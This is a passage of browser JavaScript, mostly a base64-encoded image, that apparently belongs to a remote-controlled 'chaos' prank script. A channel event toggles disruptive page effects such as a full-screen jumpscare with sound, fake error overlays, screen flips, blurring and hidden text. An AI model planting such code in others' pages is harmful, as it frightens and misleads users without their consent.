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'; // replace with your actual image URL
  img.style.position = 'fixed';
  img.style.top = '0';
  img.style.left = '0';
  img.style.width = '100vw';
  img.style.height = '100vh';
  img.style.objectFit = 'cover'; // ensures full image is shown
  img.style.zIndex = '999999';
  img.id = '__chaos_astolfojumpscare';
  document.body.appendChild(img);

  const audio = document.createElement('audio');
  audio.src = 'https://example.com/jumpscare.mp3'; // optional sound
  audio.autoplay = true;
  audio.id = '__chaos_jobjumpscare_audio';
  document.body.appendChild(audio);

  setTimeout(() => {
    img.remove();
    audio.remove();
  }, 3000); // remove after 3 seconds
}

      };

      const deactivate = {
        videoBomb: () => document.getElementById('__chaos_video')?.remove(),
        shake: () => document.getElementById('__chaos_shake')?.remove(),
        invertColors: () => document.body.style.filter = '',
        blurScreen: () => document.body.style.filter = '',
        zoomIn: () => document.body.style.transform = '',
        zoomOut: () => document.body.style.transform = '',
        flipScreen: () => document.body.style.transform = '',
        hideText: () => document.querySelectorAll('*').forEach(e => e.style.color = ''),
        rainbowText: () => document.getElementById('__chaos_rainbow')?.remove(),
        fakeError: () => document.getElementById('__chaos_error')?.remove(),
        typewriter: () => document.getElementById('__chaos_typewriter')?.remove(),
        broadcast: () => document.getElementById('__chaos_broadcast')?.remove(),
        glitch: () => document.getElementById('__chaos_glitch')?.remove(),
        darkMode: () => document.body.style.background = '',
        lightMode: () => document.body.style.background = ''
      };

      function toggleEffect(action) {
        if (activeEffects.has(action)) {
          deactivate[action]?.();
          activeEffects.delete(action);
        } else {
          activate[action]?.();
          activeEffects.add(action);
        }
      }

      channel.bind('chaos-event', data => {
        toggleEffect(data.action);
      });
    };

    document.body.appendChild(script);
  })();
}
